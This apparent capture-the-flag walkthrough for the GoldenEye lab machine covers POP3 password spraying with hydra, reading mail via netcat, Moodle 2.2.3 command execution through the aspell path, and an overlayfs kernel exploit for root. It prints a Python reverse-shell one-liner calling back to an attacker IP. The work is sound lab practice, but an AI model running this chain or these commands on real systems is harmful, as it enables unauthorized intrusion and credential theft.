> Bruteforcing, pop3 server, exif tool

# Ports

* **80** : Golden eye webpage
* **25** : Smtp server
* **5506** : POP3 server with ssl
* **5507** : POP3 server
### Port 80, 5507 are used for exploiting

# 80
1. `gobuster` gave 0 results.
2. Webpage displays a link /sev-home. Which triggers a login form. Browser response contains the header (www-authenticate)
3. Inspecting `terminal.js` file in the homepage gives a login for `boris` with password `InvincibleHack3r` in html encoding.
4. Ran `nikto -host 10.0.2.16` gives a /splashAdmin.php path.
5. /SplashAdmin.php contains a list of messages. A message from admin says that `clang` is used instead of `gcc`  in the system, this is useful if we have to do privilege escaltion using kernel exploits.
6. Possible users are boris,natalya, xenia, janus from the SplashAdmin page

# 5506,5507
1. POP3 servers. We can use `nc` to connect to it and authenticate to see the list of mails

# EXPLOITATION

After Logging into the /sev-home. The page asks us to communicate with network in charge via pop3. The in-charges are boris and natalya - obtained from html comments in the page.

## hydra
1. Password spraying pop3  port 5507 with hydra with usernames boris and natalya
2. `hydra -l boris -P ~/Wordlist/Kali/fasttrack.txt -s 55007 10.0.2.16 pop3`
    "hydra use login as boris and password from fasttrack.txt list on 10.0.2.16 at the pop3 port  55007"
3. Same command is used for natalaya and we obtain passwords `secret1!` and `bird`
4. fasttrack.txt is a small password list and can be used to check for popular passwords

## netcat
1. `nc 10.0.2.16 55007`
	- We login as natalya by `user natalya`\<CR\>`pass bird`
	- List emails with `list`. It shows 3 emails. We open them by `retr 1` `retr 2` etc
	- From the emails we obtain info to add `severnaya-station.com` to add to the  /etc/host file and the presence of a webapplication at severnaya-station.com/gnocertdir
	- The login info for the webapplication `xenia` with password `RCP90rulez!` 

2. `nc 10.0.2.16 55007`
	- We login as boris by `user boris`\<CR\>`pass secret1!`
	- Reads the emails and finds that boris is working for janus a terrorist organisation

We proceed to `severnaya-station.com/gnocertdir` and login with `xenia`'s credential obtained from the email. We do a gobuster scan, which gives us no useful results
The webapplication is a cms `moodle` with an RCE for versions 2.2 and 3.9 but we can't determine the version the cms is running. We need admin login for getting version info
Xenia has a Message from  `doak` asking her to contact him in the pop3 server in case of assistance.
Password spraying with hydra gives us password `xWinter1995x!` for user `doak` in the pop3 server using the fasttrack.txt
We list the mails of the `dr_doak` which contains his credentials for `severnaya-station/gnocertdir` :  `dr_doak` and `4England!` as password
The mail also asks us to look for the private files in his `gnocertdir` account

We login as doak and view the private file. The private file instructs us to visit `severnaya-station/dir007key/for-007.jpg` for getting the admin account password.
We navigate to the link to see the image. Downloads it for viewing exifdata.

## Exif
1. `exif for-007.png` shows a base64 encoded value in the description field. Base64 decoded value is `xWinter1995x!` which is the admin password

Logging in as admin and we find the moodle version to be `2.2.3`  in the environment setting. 
**CVE-2013-3630** [description here.](https://www.rapid7.com/db/modules/exploit/multi/http/moodle_cmd_exec/) . Path for aspell binary in the system can be changed in editor settings.
We can put a reverse shell code instead of the path and the cms will execute it when we select spell correction in the tinymce editior.

**NOTE: By default tinymce editor use google for spell checking. We need to change it to PSpellShell in [site administration>plugins>text editors>tinymce html editor] for our reverse shell code to execute.**

` python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.2.12",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' `

Add the above python reverse shell in **[site administration>server>system paths]** to the aspshell path. Obtained from pentest monkey.

Do spell checking by creating a new blog to obtain the reverse shell

# Actions in the low privilege shell
1. SUID,sudo,crontab related privesc checks are done and kernel exploit is the only viable solution.
2. Overlayfs privilege escaltion for ubuntu [ exploitdb ](https://www.exploit-db.com/exploits/37292)
3. Since the system uses clang instead of gcc, as we have noted during enumeration, we modify lines in our exploit to remove `gcc` references and rename them to `clang` and send them to the target system.
4. Compiling using `clang ofs.c ofs` in /tmp folder of the system.
5. Run the `binary`

6. We are now root.
